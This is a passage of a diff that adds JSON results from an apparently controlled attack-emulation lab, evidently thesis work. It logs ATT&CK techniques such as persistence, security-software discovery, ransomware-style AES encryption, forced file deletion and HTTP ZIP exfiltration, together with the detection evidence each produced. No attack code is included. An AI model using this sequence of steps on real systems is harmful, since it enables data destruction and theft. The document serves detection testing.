                  |     117       7     1448       5840       0,05   4700   0 vm3dservice                                                   |     118       9     1548       6412       0,11   5288   1 vm3dservice                                                   |     130      11     2040       6400       0,36   4972   0 vmnat                                                         |      87       8     7724       4996       0,06   4800   0 vmnetdhcp                                                     |     215      15     3740      10312       0,45   4792   0 vmware-authd                                                  |     299      23    15488      25128       1,61   7272   0 vmware-converter                                              |     362      27    23360      26248       1,95   8032   0 vmware-converter                                              |     320      26    14844      25472       3,23   5992   0 vmware-converter-a                                            |     227      14     2892      10908       0,33   4932   0 vmware-usbarbitrator64                                        |     447      26    17152      22488       9,44   5052   0 wazuh-agent                                                   |     164      11     1412       6848       0,30    652   0 wininit                                                       |     304      14     3088      13232       0,67    700   1 winlogon                                                      |     247      14     4500      13208       0,84   5512   0 WmiPrvSE                                                      |     271      15     3016      12636       0,77   5096   0 WMIRegistrationService"
+                                             ],
+                           "SysmonRelevantEvents":  4,
+                           "PowerShell4104RelevantEvents":  1,
+                           "Status":  "OK",
+                           "Comment":  "Windows command shell evidence with PowerShell child process."
+                       },
+                       {
+                           "TEC_ID":  "TEC-003",
+                           "NameTactic":  "Scheduled Task / T1053.005",
+                           "ScriptExecuted":  "schtasks.exe",
+                           "ScriptPath":  "C:\\Windows\\System32\\schtasks.exe",
+                           "ExitCode":  0,
+                           "Start":  "\/Date(1783859292984)\/",
+                           "End":  "\/Date(1783859301496)\/",
+                           "DurationSeconds":  8.51,
+                           "ExpectedEvidence":  [
+                                                    "schtasks create",
+                                                    "schtasks run",
+                                                    "schtasks delete",
+                                                    "Security 4698/4699 if audited",
+                                                    "Sysmon ID 1"
+                                                ],
+                           "FoundEvidence":  [
+                                                 "CreateExit=0",
+                                                 "QueryExit=0",
+                                                 "RunExit=0",
+                                                 "DeleteExit=0"
+                                             ],
+                           "SysmonRelevantEvents":  6,
+                           "PowerShell4104RelevantEvents":  0,
+                           "Status":  "OK",
+                           "Comment":  "Scheduled task lifecycle generated; run/delete may be noisy but create is primary evidence."
+                       },
+                       {
+                           "TEC_ID":  "TEC-004",
+                           "NameTactic":  "Registry Run Key / T1547.001",
+                           "ScriptExecuted":  "reg.exe",
+                           "ScriptPath":  "C:\\Windows\\System32\\reg.exe",
+                           "ExitCode":  0,
+                           "Start":  "\/Date(1783859312642)\/",
+                           "End":  "\/Date(1783859317384)\/",
+                           "DurationSeconds":  4.74,
+                           "ExpectedEvidence":  [
+                                                    "Run key add",
+                                                    "Run key query",
+                                                    "Run key delete",
+                                                    "Sysmon ID 12/13/14 if enabled"
+                                                ],
+                           "FoundEvidence":  [
+                                                 "AddExit=0",
+                                                 "QueryExit=0",
+                                                 "DeleteExit=0"
+                                             ],
+                           "SysmonRelevantEvents":  5,
+                           "PowerShell4104RelevantEvents":  0,
+                           "Status":  "OK",
+                           "Comment":  "Run Key persistence evidence generated without relying on lab paths as detector IOC."
+                       },
+                       {
+                           "TEC_ID":  "TEC-005",
+                           "NameTactic":  "Service Execution / T1569.002",
+                           "ScriptExecuted":  "sc.exe",
+                           "ScriptPath":  "C:\\Windows\\System32\\sc.exe",
+                           "ExitCode":  0,
+                           "Start":  "\/Date(1783859326930)\/",
+                           "End":  "\/Date(1783859332930)\/",
+                           "DurationSeconds":  6,
+                           "ExpectedEvidence":  [
+                                                    "Service creation",
+                                                    "System 7045",
+                                                    "Sysmon ID 1 sc.exe",
+                                                    "Service start attempt may fail with 1053"
+                                                ],
+                           "FoundEvidence":  [
+                                                 "CreateExit=0",
+                                                 "QueryExit=0",
+                                                 "StartExit=1053",
+                                                 "DeleteExit=0"
+                                             ],
+                           "SysmonRelevantEvents":  6,
+                           "PowerShell4104RelevantEvents":  0,
+                           "Status":  "OK",
+                           "Comment":  "Service creation is primary evidence; start failure is expected for cmd.exe service wrapper."
+                       },
+                       {
+                           "TEC_ID":  "TEC-006",
+                           "NameTactic":  "Security Software Discovery / T1518.001",
+                           "ScriptExecuted":  "powershell.exe; wmic.exe",
+                           "ScriptPath":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; C:\\Windows\\System32\\wbem\\wmic.exe",
+                           "ExitCode":  0,
+                           "Start":  "\/Date(1783859340922)\/",
+                           "End":  "\/Date(1783859343519)\/",
+                           "DurationSeconds":  2.6,
+                           "ExpectedEvidence":  [
+                                                    "SecurityCenter2 query",
+                                                    "AntivirusProduct",
+                                                    "Defender service discovery",
+                                                    "WMIC discovery",
+                                                    "4104 and Sysmon ID 1 if enabled"
+                                                ],
+                           "FoundEvidence":  [
+                                                 "PowerShellExit=0",
+                                                 "WMICExit=0",
+                                                 "PowerShellStdout=displayName      productState | -----------      ------------ | Windows Defender       397568"
+                                             ],
+                           "SysmonRelevantEvents":  2,
+                           "PowerShell4104RelevantEvents":  2,
+                           "Status":  "OK",
+                           "Comment":  "Security software discovery evidence generated; WMIC may be absent/deprecated."
+                       },
+                       {
+                           "TEC_ID":  "TEC-007",
+                           "NameTactic":  "Data Encrypted for Impact / T1486",
+                           "ScriptExecuted":  "Scriptransom.ps1",
+                           "ScriptPath":  "C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\Scriptransom.ps1",
+                           "ExitCode":  0,
+                           "Start":  "\/Date(1783859350466)\/",
+                           "End":  "\/Date(1783859372360)\/",
+                           "DurationSeconds":  21.89,
+                           "ExpectedEvidence":  [
+                                                    "AES/System.Security.Cryptography",
+                                                    "CryptoStream/CreateEncryptor",
+                                                    ".aes files",
+                                                    "PowerShell 4104",
+                                                    "Sysmon ID 11 if enabled"
+                                                ],
+                           "FoundEvidence":  [
+                                                 "EnumExit=0",
+                                                 "RansomExit=0",
+                                                 ".aesCount=25"
+                                             ],
+                           "SysmonRelevantEvents":  9,
+                           "PowerShell4104RelevantEvents":  4,
+                           "Status":  "OK",
+                           "Comment":  "Controlled encryption generated .aes evidence."
+                       },
+                       {
+                           "TEC_ID":  "TEC-008",
+                           "NameTactic":  "Data Destruction / T1485",
+                           "ScriptExecuted":  "powershell.exe inline controlled deletion",
+                           "ScriptPath":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                           "ExitCode":  0,
+                           "Start":  "\/Date(1783859386551)\/",
+                           "End":  "\/Date(1783859420484)\/",
+                           "DurationSeconds":  33.93,
+                           "ExpectedEvidence":  [
+                                                    "Get-ChildItem",
+                                                    "ForEach-Object",
+                                                    "Remove-Item -Force",
+                                                    "PowerShell 4104",
+                                                    "Sysmon ID 26 as forensic evidence if enabled"
+                                                ],
+                           "FoundEvidence":  [
+                                                 "ExitCode=0",
+                                                 "FilesBefore=50",
+                                                 "FilesAfter=0"
+                                             ],
+                           "SysmonRelevantEvents":  4,
+                           "PowerShell4104RelevantEvents":  3,
+                           "Status":  "OK",
+                           "Comment":  "Controlled destructive deletion executed; Sysmon ID 26 remains forensic context, not individual alert."
+                       },
+                       {
+                           "TEC_ID":  "TEC-009",
+                           "NameTactic":  "Staging / ZIP / Controlled HTTP Upload / T1074.001 T1560.001 T1048.003",
+                           "ScriptExecuted":  "exfiltracion_v3.ps1",
+                           "ScriptPath":  "C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\exfiltracion_v3.ps1",
+                           "ExitCode":  0,
+                           "Start":  "\/Date(1783859431737)\/",
+                           "End":  "\/Date(1783859513708)\/",
+                           "DurationSeconds":  81.97,
+                           "ExpectedEvidence":  [
+                                                    "ZIP",
+                                                    "local ZIP copy",
+                                                    "SHA256",
+                                                    "Invoke-WebRequest",
+                                                    "-Method POST",
+                                                    "-InFile",
+                                                    "application/zip",
+                                                    "HTTP status 200",
+                                                    "Upload succeeded True",
+                                                    "PowerShell 4104"
+                                                ],
+                           "FoundEvidence":  [
+                                                 "ReceiverReachable=True",
+                                                 "HTTPStatus=200",
+                                                 "UploadSucceeded=True",
+                                                 "Zip=C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\staging_controlled\\tec009_controlled_archive.zip",
+                                                 "ZipCopy=C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\staging_controlled\\tec009_controlled_archive_copy.zip",
+                                                 "SHA256=e67bd7943a0d0435db8b7e345dcb20af00e5cc49ca5ce66a8f4899ef9cc36422",
+                                                 "Summary=C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\staging_controlled\\tec009_transfer_summary.json",
+                                                 "ZipCount=6",
+                                                 "PS4104=1",
+                                                 "EvidenceCheckFailures=0",
+                                                 "EvidenceCheckWarnings=0"
+                                             ],
+                           "SysmonRelevantEvents":  7,
+                           "PowerShell4104RelevantEvents":  1,
+                           "Status":  "OK",
+                           "Comment":  "Controlled HTTP ZIP upload completed."
+                       }
+                   ]
+}
